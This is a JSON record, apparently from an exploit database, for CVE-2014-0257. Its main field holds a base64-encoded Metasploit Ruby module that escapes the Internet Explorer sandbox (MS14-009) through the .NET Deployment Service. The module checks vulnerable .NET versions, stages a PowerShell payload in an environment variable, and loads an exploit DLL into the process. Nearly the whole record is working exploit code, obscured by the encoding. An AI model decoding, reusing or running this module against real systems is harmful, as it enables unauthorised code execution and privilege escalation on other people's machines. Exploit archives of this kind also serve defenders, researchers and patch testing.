{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cC8vbWV0YXNwbG9pdC5jb20vZG93bmxvYWQNCiMgQ3VycmVudCBzb3VyY2U6IGh0dHBzOi8vZ2l0aHViLmNvbS9yYXBpZDcvbWV0YXNwbG9pdC1mcmFtZXdvcmsNCiMjDQoNCnJlcXVpcmUgJ21zZi9jb3JlJw0KcmVxdWlyZSAncmV4Jw0KcmVxdWlyZSAnbXNmL2NvcmUvZXhwbG9pdC9leGUnDQpyZXF1aXJlICdtc2YvY29yZS9leHBsb2l0L3Bvd2Vyc2hlbGwnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpMb2NhbA0KICBSYW5rID0gR3JlYXRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlBvd2Vyc2hlbGwNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OkVYRQ0KICBpbmNsdWRlIE1zZjo6UG9zdDo6V2luZG93czo6UHJpdg0KICBpbmNsdWRlIE1zZjo6UG9zdDo6V2luZG93czo6RmlsZUluZm8NCiAgaW5jbHVkZSBNc2Y6OlBvc3Q6OkZpbGUNCg0KICBORVRfVkVSU0lPTlMgPSB7DQogICAgJzQuNScgPT4gew0KICAgICAgJ2Rmc3ZjJyA9PiAnNC4wLjMwMzE5LjE3OTI5LjE3JywNCiAgICAgICdtc2NvcmxpYicgPT4gJzQuMC4zMDMxOS4xODA2My4xOCcNCiAgICB9LA0KICAgICc0LjUuMScgPT4gew0KICAgICAgJ2Rmc3ZjJyA9PiAnNC4wLjMwMzE5LjE4NDA4LjE4JywNCiAgICAgICdtc2NvcmxpYicgPT4gJzQuMC4zMDMxOS4xODQ0NC4xOCcNCiAgICB9DQogIH0NCg0KICBkZWYgaW5pdGlhbGl6ZShpbmZvPXt9KQ0KICAgIHN1cGVyKCB1cGRhdGVfaW5mbyggaW5mbywNCiAgICAgICdOYW1lJyAgICA9PiAnTVMxNC0wMDkgLk5FVCBEZXBsb3ltZW50IFNlcnZpY2UgSUUgU2FuZGJveCBFc2NhcGUnLA0KICAgICAgJ0Rlc2NyaXB0aW9uJyAgPT4gJXF7DQogICAgICAgIFRoaXMgbW9kdWxlIGFidXNlcyBhIHByb2Nlc3MgY3JlYXRpb24gcG9saWN5IGluIHRoZSBJbnRlcm5ldCBFeHBsb3JlciBTYW5kYm94IHdoaWNoIGFsbG93cw0KICAgICAgICB0byBlc2NhcGUgdGhlIEVuaGFuY2VkIFByb3RlY3RlZCBNb2RlIGFuZCBleGVjdXRlIGNvZGUgd2l0aCBNZWRpdW0gSW50ZWdyaXR5LiBUaGUgcHJvYmxlbQ0KICAgICAgICBleGlzdHMgaW4gdGhlIC5ORVQgRGVwbG95bWVudCBTZXJ2aWNlIChkZnN2Yy5leGUpLCB3aGljaCBjYW4gYmUgcnVuIGFzIE1lZGl1bSBJbnRlZ3JpdHkNCiAgICAgICAgTGV2ZWwuIEZ1cnRoZXIgaW50ZXJhY3Rpb24gd2l0aCB0aGUgY29tcG9uZW50IGFsbG93cyB0byBlc2NhcGUgdGhlIEVuaGFuY2VkIFByb3RlY3RlZCBNb2RlDQogICAgICAgIGFuZCBleGVjdXRlIGFyYml0cmFyeSBjb2RlIHdpdGggTWVkaXVtIEludGVncml0eS4NCiAgICAgIH0sDQogICAgICAnTGljZW5zZScgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ0F1dGhvcicgID0+DQogICAgICAgIFsNCiAgICAgICAgICAnSmFtZXMgRm9yc2hhdycsICMgVnVsbmVyYWJpbGl0eSBEaXNjb3ZlcnkgYW5kIG9yaWdpbmFsIGV4cGxvaXQgY29kZQ0KICAgICAgICAgICdqdWFuIHZhenF1ZXonICMgbWV0YXNwbG9pdCBtb2R1bGUNCiAgICAgICAgXSwNCiAgICAgICdQbGF0Zm9ybScgICAgICA9PiBbICd3aW4nIF0sDQogICAgICAnU2Vzc2lvblR5cGVzJyAgPT4gWyAnbWV0ZXJwcmV0ZXInIF0sDQogICAgICAnVGFyZ2V0cycgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdJRSA4IC0gMTEnLCB7IH0gXQ0KICAgICAgICBdLA0KICAgICAgJ0RlZmF1bHRUYXJnZXQnID0+IDAsDQogICAgICAnRGVmYXVsdE9wdGlvbnMnICA9Pg0KICAgICAgICB7DQogICAgICAgICAgJ1dmc0RlbGF5JyA9PiAzMA0KICAgICAgICB9LA0KICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJz0+ICJGZWIgMTEgMjAxNCIsDQogICAgICAnUmVmZXJlbmNlcycgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsnQ1ZFJywgJzIwMTQtMDI1NyddLA0KICAgICAgICAgIFsnTVNCJywgJ01TMTQtMDA5J10sDQogICAgICAgICAgWydCSUQnLCAnNjU0MTcnXSwNCiAgICAgICAgICBbJ1VSTCcsICdodHRwczovL2dpdGh1Yi5jb20vdHlyYW5pZC9JRTExU2FuZGJveEVzY2FwZXMnXQ0KICAgICAgICBdDQogICAgKSkNCiAgZW5kDQoNCiAgZGVmIGNoZWNrDQogICAgdW5sZXNzIGZpbGVfZXhpc3Q/KCIje2dldF9lbnYoIndpbmRpciIpfVxcTWljcm9zb2Z0Lk5FVFxcRnJhbWV3b3JrXFx2NC4wLjMwMzE5XFxkZnN2Yy5leGUiKQ0KICAgICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6VW5rbm93bg0KICAgIGVuZA0KDQogICAgbmV0X3ZlcnNpb24gPSBnZXRfbmV0X3ZlcnNpb24NCg0KICAgIGlmIG5ldF92ZXJzaW9uLmVtcHR5Pw0KICAgICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6VW5rbm93bg0KICAgIGVuZA0KDQogICAgdW5sZXNzIGZpbGVfZXhpc3Q/KCIje2dldF9lbnYoIndpbmRpciIpfVxcTWljcm9zb2Z0Lk5FVFxcRnJhbWV3b3JrXFx2NC4wLjMwMzE5XFxtc2NvcmxpYi5kbGwiKQ0KICAgICAgcmV0dXJuIEV4cGxvaXQ6OkNoZWNrQ29kZTo6RGV0ZWN0ZWQNCiAgICBlbmQNCg0KICAgIG1zY29ybGliX3ZlcnNpb24gPSBnZXRfbXNjb3JsaWJfdmVyc2lvbg0KDQogICAgaWYgR2VtOjpWZXJzaW9uLm5ldyhtc2NvcmxpYl92ZXJzaW9uKSA+PSBHZW06OlZlcnNpb24ubmV3KE5FVF9WRVJTSU9OU1tuZXRfdmVyc2lvbl1bIm1zY29ybGliIl0pDQogICAgICByZXR1cm4gRXhwbG9pdDo6Q2hlY2tDb2RlOjpTYWZlDQogICAgZW5kDQoNCiAgICBFeHBsb2l0OjpDaGVja0NvZGU6OlZ1bG5lcmFibGUNCiAgZW5kDQoNCiAgZGVmIGdldF9uZXRfdmVyc2lvbg0KICAgIG5ldF92ZXJzaW9uID0gIiINCg0KICAgIGRmc3ZjX3ZlcnNpb24gPSBmaWxlX3ZlcnNpb24oIiN7Z2V0X2Vudigid2luZGlyIil9XFxNaWNyb3NvZnQuTkVUXFxGcmFtZXdvcmtcXHY0LjAuMzAzMTlcXGRmc3ZjLmV4ZSIpDQogICAgZGZzdmNfdmVyc2lvbiA9IGRmc3ZjX3ZlcnNpb24uam9pbigiLiIpDQoNCiAgICBORVRfVkVSU0lPTlMuZWFjaCBkbyB8ayx2fA0KICAgICAgaWYgdlsiZGZzdmMiXSA9PSBkZnN2Y192ZXJzaW9uDQogICAgICAgIG5ldF92ZXJzaW9uID0gaw0KICAgICAgZW5kDQogICAgZW5kDQoNCiAgICBuZXRfdmVyc2lvbg0KICBlbmQNCg0KICBkZWYgZ2V0X21zY29ybGliX3ZlcnNpb24NCiAgICBtc2NvcmxpYl92ZXJzaW9uID0gZmlsZV92ZXJzaW9uKCIje2dldF9lbnYoIndpbmRpciIpfVxcTWljcm9zb2Z0Lk5FVFxcRnJhbWV3b3JrXFx2NC4wLjMwMzE5XFxtc2NvcmxpYi5kbGwiKQ0KICAgIG1zY29ybGliX3ZlcnNpb24uam9pbigiLiIpDQogIGVuZA0KDQogIGRlZiBleHBsb2l0DQogICAgcHJpbnRfc3RhdHVzKCJSdW5uaW5nIG1vZHVsZSBhZ2FpbnN0ICN7c3lzaW5mb1snQ29tcHV0ZXInXX0iKSB1bmxlc3Mgc3lzaW5mby5uaWw/DQoNCiAgICBtb2RfaGFuZGxlID0gc2Vzc2lvbi5yYWlsZ3VuLmtlcm5lbDMyLkdldE1vZHVsZUhhbmRsZUEoJ2lleHBsb3JlLmV4ZScpDQogICAgaWYgbW9kX2hhbmRsZVsncmV0dXJuJ10gPT0gMA0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6Ok5vdFZ1bG5lcmFibGUsICJOb3QgcnVubmluZyBpbnNpZGUgYW4gSW50ZXJuZXQgRXhwbG9yZXIgcHJvY2VzcyIpDQogICAgZW5kDQoNCiAgICB1bmxlc3MgZ2V0X2ludGVncml0eV9sZXZlbCA9PSBJTlRFR1JJVFlfTEVWRUxfU0lEWzpsb3ddDQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6Tm90VnVsbmVyYWJsZSwgIk5vdCBydW5uaW5nIGF0IExvdyBJbnRlZ3JpdHkiKQ0KICAgIGVuZA0KDQogICAgcHJpbnRfc3RhdHVzKCJTZWFyY2hpbmcgLk5FVCBEZXBsb3ltZW50IFNlcnZpY2UgKGRmc3ZjLmV4ZSkuLi4iKQ0KDQogICAgdW5sZXNzIGZpbGVfZXhpc3Q/KCIje2dldF9lbnYoIndpbmRpciIpfVxcTWljcm9zb2Z0Lk5FVFxcRnJhbWV3b3JrXFx2NC4wLjMwMzE5XFxkZnN2Yy5leGUiKQ0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6Ok5vdFZ1bG5lcmFibGUsICIuTkVUIERlcGxveW1lbnQgU2VydmljZSAoZGZzdmMuZXhlKSBub3QgZm91bmQiKQ0KICAgIGVuZA0KDQogICAgbmV0X3ZlcnNpb24gPSBnZXRfbmV0X3ZlcnNpb24NCg0KICAgIGlmIG5ldF92ZXJzaW9uLmVtcHR5Pw0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6Ok5vdFZ1bG5lcmFibGUsICJUaGlzIG1vZHVsZSBvbmx5IHRhcmdldHMgLk5FVCBEZXBsb3ltZW50IFNlcnZpY2UgZnJvbSAuTkVUIDQuNSBhbmQgLk5FVCA0LjUuMSIpDQogICAgZW5kDQoNCiAgICBwcmludF9nb29kKCIuTkVUIERlcGxveW1lbnQgU2VydmljZSBmcm9tIC5ORVQgI3tuZXRfdmVyc2lvbn0gZm91bmQuIikNCg0KICAgIHByaW50X3N0YXR1cygiQ2hlY2tpbmcgaWYgLk5FVCBpcyBwYXRjaGVkLi4uIikNCg0KICAgIHVubGVzcyBmaWxlX2V4aXN0PygiI3tnZXRfZW52KCJ3aW5kaXIiKX1cXE1pY3Jvc29mdC5ORVRcXEZyYW1ld29ya1xcdjQuMC4zMDMxOVxcbXNjb3JsaWIuZGxsIikNCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpOb3RWdWxuZXJhYmxlLCAiLk5FVCBJbnN0YWxsYXRpb24gY2FuIG5vdCBiZSB2ZXJpZmllZCAobXNjb3JsaWIuZGxsIG5vdCBmb3VuZCkiKQ0KICAgIGVuZA0KDQogICAgbXNjb3JsaWJfdmVyc2lvbiA9IGdldF9tc2NvcmxpYl92ZXJzaW9uDQoNCiAgICBpZiBHZW06OlZlcnNpb24ubmV3KG1zY29ybGliX3ZlcnNpb24pID49IEdlbTo6VmVyc2lvbi5uZXcoTkVUX1ZFUlNJT05TW25ldF92ZXJzaW9uXVsibXNjb3JsaWIiXSkNCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpOb3RWdWxuZXJhYmxlLCAiLk5FVCBJbnN0YWxsYXRpb24gbm90IHZ1bG5lcmFibGUiKQ0KICAgIGVuZA0KDQogICAgcHJpbnRfZ29vZCgiLk5FVCBsb29rcyB2dWxuZXJhYmxlLCBleHBsb2l0aW5nLi4uIikNCg0KICAgIGNtZCA9IGNtZF9wc2hfcGF5bG9hZChwYXlsb2FkLmVuY29kZWQpLmdzdWIoJyVDT01TUEVDJSAvQiAvQyBzdGFydCBwb3dlcnNoZWxsLmV4ZSAnLCcnKS5zdHJpcA0KICAgIHNlc3Npb24ucmFpbGd1bi5rZXJuZWwzMi5TZXRFbnZpcm9ubWVudFZhcmlhYmxlQSgiUFNIQ01EIiwgY21kKQ0KDQogICAgdGVtcCA9IGdldF9lbnYoJ1RFTVAnKQ0KDQogICAgcHJpbnRfc3RhdHVzKCJMb2FkaW5nIEV4cGxvaXQgTGlicmFyeS4uLiIpDQoNCiAgICBzZXNzaW9uLmNvcmUubG9hZF9saWJyYXJ5KA0KICAgICAgICAnTGlicmFyeUZpbGVQYXRoJyA9PiA6OkZpbGUuam9pbihNc2Y6OkNvbmZpZy5kYXRhX2RpcmVjdG9yeSwgImV4cGxvaXRzIiwgIkNWRS0yMDE0LTAyNTciLCAiQ1ZFLTIwMTQtMDI1Ny5kbGwiKSwNCiAgICAgICAgJ1RhcmdldEZpbGVQYXRoJyAgPT4gdGVtcCArICAiXFxDVkUtMjAxNC0wMjU3LmRsbCIsDQogICAgICAgICdVcGxvYWRMaWJyYXJ5JyAgID0+IHRydWUsDQogICAgICAgICdFeHRlbnNpb24nICAgICAgID0+IGZhbHNlLA0KICAgICAgICAnU2F2ZVRvRGlzaycgICAgICA9PiBmYWxzZQ0KICAgICkNCiAgZW5kDQoNCiAgZGVmIGNsZWFudXANCiAgICBzZXNzaW9uLnJhaWxndW4ua2VybmVsMzIuU2V0RW52aXJvbm1lbnRWYXJpYWJsZUEoIlBTSENNRCIsIG5pbCkNCiAgICBzdXBlcg0KICBlbmQNCg0KZW5k", 
    "filename": "platforms/windows/local/33892.rb", 
    "id": "33892", 
    "cves": [
        "CVE-2014-0257"
    ]
}